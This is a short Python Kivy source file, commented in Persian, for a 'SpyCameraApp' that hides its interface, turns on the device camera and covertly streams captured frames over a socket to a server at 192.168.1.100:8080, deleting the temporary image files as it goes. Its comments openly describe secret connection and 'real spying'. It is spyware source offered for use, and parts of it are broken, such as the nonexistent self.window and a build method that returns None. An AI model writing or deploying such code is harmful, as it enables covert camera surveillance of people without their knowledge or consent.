from kivy.app import App
from kivy.uix.camera import Camera
from kivy.clock import Clock
import socket
import time

class SpyCameraApp(App):

    def build(self):
        # مخفی کردن رابط کاربری برای اجرا در پس‌زمینه
        self.window.clear_widgets()
        
        self.camera = Camera(
            play=True,
            resolution=(640, 480),
            on_texture=self.capture_and_send
        )
        
        # شروع ارسال تصویر بلافاصله پس از آماده شدن دوربین
        Clock.schedule_once(self.start_spying, 1)
        return None

    def start_spying(self, dt):
        # اتصال مخفیانه به سرور
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect(('192.168.1.100', 8080))
            self.is_connected = True
        except:
            self.is_connected = False

    def capture_and_send(self, instance):
        if not self.is_connected:
            return
        
        # گرفتن فریم از دوربین
        self.camera.texture.save("frame.png")
        
        # ارسال داده‌های خام تصویر (در اینجا فایل ذخیره شده ارسال می‌شود)
        # برای کارایی بیشتر در حالت جاسوسی واقعی، باید باکس باکس را مستقیماً بفرستد
        # اما اینجا فایل را به سرور می‌فرستیم
        try:
            with open("frame.png", "rb") as f:
                data = f.read()
            self.sock.sendall(data)
        except:
            pass
        
        # پاکسازی فایل موقت
        try:
            import os
            os.remove("frame.png")
        except:
            pass

if __name__ == "__main__":
    SpyCameraApp().run()

